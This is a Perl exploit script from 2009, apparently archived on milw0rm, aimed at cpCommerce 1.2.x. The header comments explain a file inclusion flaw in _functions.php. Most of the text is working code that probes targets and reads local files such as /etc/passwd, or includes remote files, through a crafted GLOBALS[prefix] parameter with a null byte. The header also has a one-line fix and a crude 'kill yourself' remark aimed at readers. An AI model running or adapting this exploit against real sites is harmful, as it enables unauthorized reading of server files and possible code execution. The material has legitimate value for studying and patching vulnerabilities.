<html><head><title>cpCommerce 1.2.x GLOBALS[prefix] Arbitrary File Inclusion Exploit</title></head><pre>#!/usr/bin/perl
# 
# cpCommerce 1.2.x GLOBALS[prefix] Arbitrary File Inclusion Exploit
# 
# by staker
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# mail: staker[at]hotmail[dot]it
# url: http://cpcommerce.cpradio.org
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#  
# it works with register_globals=on
# if you wanna carry out a LFI -&gt; mq=off 
#
# short explanation:
#
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# cpCommerce contains one flaw that allows an
# attacker to include a remote or local file
# because of require_once() in _functions.php
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# File _functions.php
# 
#  [begin block code] 
#  ------------------
#
#  define(&quot;CPCOMMERCE_LOADED&quot;, true);
#  ini_set(&quot;register_globals&quot;,0);     &lt;------ {1} totally useless
#  error_reporting(E_ALL ^ E_NOTICE);
#
#  // Older PHP Versions
#  if (phpversion() &lt; &quot;4.0.6&quot; &amp;&amp; isset($HTTP_POST_VARS))
#    $_POST = ($HTTP_POST_VARS);
#  if (phpversion() &lt; &quot;4.0.6&quot; &amp;&amp; isset($HTTP_GET_VARS))
#    $_GET = ($HTTP_GET_VARS);
#  if (phpversion() &lt; &quot;4.0.6&quot; &amp;&amp; isset($HTTP_COOKIE_VARS))
#    $_COOKIE = ($HTTP_COOKIE_VARS);
#  if (phpversion() &lt; &quot;4.0.6&quot; &amp;&amp; isset($HTTP_SERVER_VARS))
#    $_SERVER = ($HTTP_SERVER_VARS);
#  if (phpversion() &lt; &quot;4.0.6&quot; &amp;&amp; isset($HTTP_POST_FILES))
#    $_FILES = ($HTTP_POST_FILES);
#  if (phpversion() &lt; &quot;4.0.6&quot; &amp;&amp; isset($HTTP_SESSION_VARS))
#    $_SESSION = ($HTTP_SESSION_VARS);
#  
# // Start MySQL and Sessions
# session_start();
#
#  // Resolve PHP running under fcgi
#  if (empty($_SERVER['PHP_SELF']))
#    $_SERVER['PHP_SELF'] = $_SERVER['SCRIPT_NAME'];
#
#  ## Protect prefix vulnerability
#  if (strpos($_SERVER['PHP_SELF'],&quot;_functions.php&quot;) !== false)
#                   header(&quot;Location: {$_SERVER['HTTP_HOST']}&quot;); &lt;------ {2} exit or die function?
#  if (!isset($prefix) || isset($_REQUEST['prefix'])) $prefix = &quot;&quot;; &lt;--- {3} this is interesting
#
# ## Include Configuration Files
# require_once(&quot;{$prefix}_config.php&quot;); &lt;-------- {4} include $prefix variable + _config.php
# 
# ----------------
# [end block code] 
#
# Explanation (code snippet above [points]) 
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# 1. actually ini_set() doesn't work..so doesn't change anything
# 2. header() needs an exit or die function otherwise is useless
# 2. because of header() without die we bypass the direct access
# 3. all REQUEST variables are not allowed,what about GLOBALS[]?
# 4. require_once() include $prefix variable.
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#
# It's not possible to include a remote/local file using a web
# browser because you will be automatically redirected in another
# page ($_SERVER['HTTP_HOST']). What about scripts or curl? yeah
#
# http://[target]/[path]/_functions.php?GLOBALS[prefix]=[FILE]
# 
# Various:
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# They didn't help me but i wanna give a thanks to girex,str0ke
# Gianluka_95,p3ri0d,mrdoktom,Aquilo &amp; http://zeroidentity.org
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# Don't contact me on messenger,i'm bored of stupid questions!
# so if you wanna help about exploit usage. kill yourself ok?
# I didn't contact anyone to fix this bug, at least not yet,
# but i release a possible fix here:
#
# _functions.php line: 36 Replace it with the following code: 
# 
# die(header(&quot;Location: http://{$_SERVER['HTTP_HOST']}&quot;)); 
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
# Today is: 23 May 2009. 
# Location: Italy,Turin.
# http://www.youtube.com/watch?v=TmFi2snLr7o
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

use LWP::UserAgent;


print &quot;[*--------------------------------------------------------------*]\n&quot;.
      &quot;[* cpCommerce 1.2.x GLOBALS[prefix] Arbitrary Inclusion Exploit *]\n&quot;.
      &quot;[*--------------------------------------------------------------*]\n&quot;. 
      &quot;[* Usage: ./cpCommerce.pl [target]/[path] [filename] [proxy]    *]\n&quot;.
      &quot;[* [filename] such as /etc/passwd or http://milw0rm.com         *]\n&quot;.
      &quot;[* [proxy] is optional ex: 151.21.42.10:8080                    *]\n&quot;.
      &quot;[*--------------------------------------------------------------*]\n&quot;;


die &quot;Example: localhost/cpcommerce /etc/passwd\n&quot; unless @ARGV; 
        
my $host = $ARGV[0];
my $type = $ARGV[1];

my $expl = new cpCommerce;

print $expl-&gt;vulnerable($host);
print $expl-&gt;local_file($host,$type);
 


package cpCommerce;

sub new
{   
        my $class = shift;
        my $self = {};
     
        $self-&gt;{vulnerable} = undef;
        $self-&gt;{parse_url}  = undef;
        $self-&gt;{local_file} = undef;
        
        bless($self,$class);
        
        return $self;
}



sub vulnerable
{           
        my ($class,$host) = @_; 
        
        my $www = new LWP::UserAgent(
                                      max_redirect =&gt; 0,
                                      agent        =&gt; 'ELinks/0.9.3 (textmode; Linux 2.6.11 i686; 79x24)',
                                    ) || die $!;
        
        if ($ARGV[2] =~ /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}?$/) {
               $www-&gt;proxy(['http', 'ftp'], $class-&gt;parse_url($ARGV[2]));
        } 
                                      
        $host = $class-&gt;parse_url($host);
             
        my $exter = $www-&gt;get($host.'/_functions.php?GLOBALS[prefix]=http://');    
        my $local = $www-&gt;get($host.'/_functions.php?GLOBALS[prefix]=%00');
        my @check = ();
        
        push(@check,'LFI') unless $local-&gt;content =~ /0_config.php'/i;
        push(@check,'RFI') unless $exter-&gt;content =~ /URL file-access is disabled/i;
             
        if (scalar(@check) == 0) {
              return &quot;Site not vulnerable because of php.ini settings.\n&quot;;
        }
        else {
              return &quot;Vulnerable to: ${check[0]} ${check[1]}\n&quot;;
        }                
}       


sub local_file
{
       my ($class,$host,$file) = @_;
       
       my $www = new LWP::UserAgent(
                                     max_redirect =&gt; 0,
                                     agent        =&gt; 'Lynxy/6.6.6dev.8 libwww-FM/3.14159FM',
                                   ) || die $!;  
       
       if ($ARGV[2] =~ /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}?$/) {
               $www-&gt;proxy(['http', 'ftp'], $class-&gt;parse_url($ARGV[2]));
       }  
       
       $host = $class-&gt;parse_url($host);
       
       my $request = $www-&gt;get($host.'/_functions.php?GLOBALS[prefix]='.$file.'%00');
       my $result;
       
       if ($request-&gt;status_line =~ /^302|200|301/ || $request-&gt;is_success) 
       {
              if ($request-&gt;content =~ /Failed opening/i) {
                    return &quot;Exploit failed.\n&quot;;
              }
              else {
                    my @result = split /No database selected/,$request-&gt;content;
                    return $result[0];
              }       
       }
       else 
       {
              if ($request-&gt;as_string !~ /(ecommerce|oscommerce)/i) {
                    return &quot;cpCommerce not found\n&quot;;
              }
              else {
                    $request-&gt;as_string;
              }      
       }           
}
               

sub parse_url
{
        my ($class,$string) = @_;
        
        if ($string !~ /^http:\/\/?/i) {
                $string = 'http://'.$string;
        }
        
        return $string;
}                 

# milw0rm.com [2009-05-26]</pre></html>